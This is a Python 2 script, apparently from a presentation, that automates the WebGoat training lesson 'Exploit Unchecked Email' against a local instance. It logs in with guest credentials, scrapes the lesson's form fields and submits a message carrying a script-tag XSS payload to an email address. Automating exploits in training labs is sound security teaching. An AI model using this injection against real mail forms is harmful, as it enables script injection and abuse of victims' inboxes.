#Python2.7
import requests
import argparse
import json
import re
import sys
# Example from presentation
def exploit_unchecked_email():
	#start session
	session = requests.Session()
	#Webgoat login page get
	host = '127.0.0.1'
	port = '8082'
	webgoat_main_address = 'http://' + host + ':' + port + '/WebGoat/'
	webgoat_session = session.get( webgoat_main_address +'login.mvc' )
	lesson_name = "Exploit Unchecked Email"

	try:
		#session token store
		cookie = webgoat_session.cookies

		login_parameters = {'username': 'guest', 'password': 'guest'}
		#login to access content
		login = session.post( webgoat_main_address + 'j_spring_security_check;jsessionid=' + str(cookie['JSESSIONID']), login_parameters )

		#access all lessons json and finding lesson api address by lesson name 
		#we could use direct link to lesson but thats just different approach
		webgoat_lesson_api = session.get( webgoat_main_address + 'service/lessonmenu.mvc' )
		webgoat_lesson_api_split = webgoat_lesson_api.text.split('},{')

		for i in webgoat_lesson_api_split:
			if 'name\":\"' + lesson_name in i:
				lesson_api = i.split( "," )

		#prepare lesson address
		lesson_address = str( lesson_api[4].split( "\"" )[3] )
		lesson_parted_address = lesson_address[1:].split( '/' )
		lesson_prepared_api_address = lesson_parted_address[0] + '?Screen=' + lesson_parted_address[1] + '&menu=' + lesson_parted_address[2]

		#get form inputs ids
		form_result =  session.post(  webgoat_main_address + lesson_prepared_api_address )
		target_page_split = form_result.text.split( '<' )
		collector = []
		for i in target_page_split:
			if 'input ' in i:
				collector.append( i.split("name=\'")[1].split("\'")[0] )
			# space here is important cause we dont want ending tags
			if 'textarea ' in i:
				collector.append( i.split("name=\'")[1].split("\'")[0] )
			if 'type=\'SUBMIT\'' in i:
				collector.append( i.split("value=\'")[1].split("\'>")[0] )

		#prepare data to send
		data = "{ "
		for i in collector:
			if 'SUBMIT' in i:
				data += "\"" + str( i ) + "\":" + "\"" + collector[len( collector )-1] + "\"" 
				break
			else:
				data += "\"" + str( i ) + "\":" + "\"test\", " 
		data += " }"
		data_json = json.loads(data)
		data_json["gId"] = 'GMail id'
		data_json["msg"] = '<script language="javascript" type="text/javascript">alert("Goyello contest");</script>'
		data_json["to"] = 'michal.szalkowski@goyello.com'

		#execute attack
		session.headers.update( {'Content-Type': 'application/x-www-form-urlencoded'} )
		end_result =  session.post(  webgoat_main_address + lesson_prepared_api_address, data_json )

		#validate
		if 'You sent the following message to' in end_result.text:
			print 'Success mail check vulnerability is still present'
		else:
			print 'Unfortunetaly it isn\'t working any more'

		#validation 
		
	except Exception as e:
		print e

#Example from presentation
exploit_unchecked_email()